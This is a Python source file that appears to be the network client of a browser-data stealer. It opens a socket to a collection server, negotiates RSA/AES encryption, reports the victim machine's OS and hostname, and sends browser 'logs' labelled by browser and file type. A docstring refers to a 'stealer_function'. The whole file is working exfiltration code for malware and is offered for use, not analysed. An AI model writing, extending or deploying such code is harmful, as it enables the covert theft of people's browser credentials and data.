""" IMPORTS """
import sys
import json
import socket
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

from util.general import FORMAT


""" CONSTANTS """
ADDRESS_HOST = 'localhost'
ADDRESS_PORT = 4813

CLIENT_HEADER_LEN = 16
AES_KEY_SIZE = 128 // 8
PUBLIC_KEY_LEN = 600

socket_info = {
    'client': None,
    'cipher': None,
}


def try_socket(socket_function):
    """ Decorator function which ignores Exceptions when calling stealer_function """
    def wrapper(*args, **kwargs):
        try:
            # Try calling socket_function
            socket_function(*args, **kwargs)
        except AttributeError as e:
            # Ignore errors related to no socket connection when sending
            if e != "'NoneType' object has no attribute 'send'":
                print(e)
        except Exception as e:
            # Ignore any Exceptions
            print(e)

    return wrapper


@try_socket
def socket_initialise() -> None:
    """ Creates socket connection to server """
    # Connect to server
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ADDRESS_HOST, ADDRESS_PORT))
    socket_info['client'] = client

    # Get public key for encryption
    public_key = client.recv(PUBLIC_KEY_LEN)
    public_key = b64decode(public_key)

    # Create RSA cipher object from public key
    key = RSA.import_key(public_key)
    rsa_cipher = PKCS1_OAEP.new(key)

    # Generate AES key and nonce
    aes_key = get_random_bytes(AES_KEY_SIZE)
    aes_nonce = get_random_bytes(AES_KEY_SIZE)

    # Generate AES cipher
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, aes_nonce)
    socket_info['cipher'] = aes_cipher

    # Encrypt AES key and nonce with public key
    socket_send_message({
        'key': b64encode(aes_key).decode(FORMAT),
        'nonce': b64encode(aes_nonce).decode(FORMAT),
    }, rsa_cipher)

    # Send client info to server
    socket_send_message({
        'os': sys.platform,
        'computer': socket.gethostname(),
    }, aes_cipher)



def socket_send_message(data: dict, cipher) -> None:
    """ Sends data to the socket server """
    # No socket connection
    client = socket_info['client']
    if not client:
        return

    # Encode data
    encoded_data = json.dumps(data).encode(FORMAT)

    # Encrypt data
    encrypted_data = cipher.encrypt(pad(encoded_data, AES.block_size))

    # Calculate message length
    message_length = len(encrypted_data)

    # Send message length as header
    message_length = str(message_length).encode(FORMAT)
    header_length = len(message_length)
    padding = b' ' * (CLIENT_HEADER_LEN - header_length)
    client.send(message_length + padding)

    # Send message
    print(f'Sent {len(encrypted_data)} bytes')
    client.send(encrypted_data)


@try_socket
def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
    """ Send log to socket server """
    aes_cipher = socket_info['cipher']
    socket_send_message({
        'browser': browser_name,
        'type': file_name,
        'data': data,
    }, aes_cipher)
